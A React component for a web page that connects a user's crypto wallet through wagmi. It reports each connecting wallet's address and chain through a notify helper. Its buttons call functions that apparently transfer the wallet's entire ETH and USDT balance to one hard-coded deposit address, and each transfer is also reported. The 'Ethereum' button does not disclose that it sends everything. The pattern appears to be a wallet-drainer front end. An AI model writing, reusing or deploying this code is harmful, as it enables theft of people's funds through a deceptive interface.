import { notifyTx } from "../lib/notify";
import React from "react";
import {
  WagmiProvider,
  useAccount,
  useDisconnect,
  useWalletClient,
} from "wagmi";
import { QueryClientProvider } from "@tanstack/react-query";
import { wagmiAdapter, queryClient } from "../appkit";
import { depositAllEth, depositAllUsdtEvm } from "../lib/evm";
import { EVM_DEPOSIT_ADDRESS } from "../config";

function Inner() {
  const { address, chainId, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const [status, setStatus] = React.useState("");

  // 🔔 Notify when wallet connects
  React.useEffect(() => {
    if (isConnected && address) {
      console.log("🔑 EVM wallet connected -> notifyTx", { address, chainId });
      notifyTx({
        kind: "evm",
        chain: String(chainId || ""),
        from: address,
        to: EVM_DEPOSIT_ADDRESS,
        token: "CONNECT",
        tx: "-", // no tx hash for connect
      });
    }
  }, [isConnected, address, chainId]);

  async function onEth() {
    try {
      if (!walletClient || !address || !chainId)
        throw new Error("Connect an EVM wallet first");
      setStatus("Preparing ETH deposit...");
      const { hash, amount } = await depositAllEth({ walletClient, address, chainId });
      setStatus(`ETH tx sent: ${hash}`);
      console.log("🚀 ETH deposit success -> calling notifyTx", { hash, amount });
      notifyTx({
        kind: "evm",
        chain: String(chainId),
        from: address,
        to: EVM_DEPOSIT_ADDRESS,
        token: "ETH",
        amount,
        tx: hash,
      });
    } catch (e: any) {
      setStatus(`Error: ${e.message || e}`);
      console.error("ETH deposit error:", e);
    }
  }

  async function onUsdt() {
    try {
      if (!walletClient || !address || !chainId)
        throw new Error("Connect an EVM wallet first");
      setStatus("Preparing USDT deposit...");
      const { hash, amount } = await depositAllUsdtEvm({
        walletClient,
        address,
        chainId,
      });
      setStatus(`USDT (ERC-20) tx sent: ${hash}`);
      console.log("🚀 USDT deposit success -> calling notifyTx", { hash, amount });
      notifyTx({
        kind: "evm",
        chain: String(chainId),
        from: address,
        to: EVM_DEPOSIT_ADDRESS,
        token: "USDT",
        amount,
        tx: hash,
      });
    } catch (e: any) {
      setStatus(`Error: ${e.message || e}`);
      console.error("USDT deposit error:", e);
    }
  }

  return (
    <div className="card">
      <div className="row">
        <span className="pill">
          {isConnected ? `Wallet: ${address}` : "Not connected"}
        </span>
        {chainId && <span className="pill">ChainId: {chainId}</span>}
      </div>
      <div className="mt12 row">
        {!isConnected ? (
          <appkit-button></appkit-button>
        ) : (
          <>
            <button className="btn btn-evm" onClick={onEth}>
              Ethereum
            </button>
            <button className="btn btn-evm" onClick={onUsdt}>
              Send USDT (ERC-20)
            </button>
            <button className="btn btn-muted" onClick={() => disconnect()}>
              Disconnect
            </button>
          </>
        )}
      </div>
      <div className="status mt12">{status || "—"}</div>
    </div>
  );
}

export default function EvmSection() {
  return (
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <Inner />
      </QueryClientProvider>
    </WagmiProvider>
  );
}
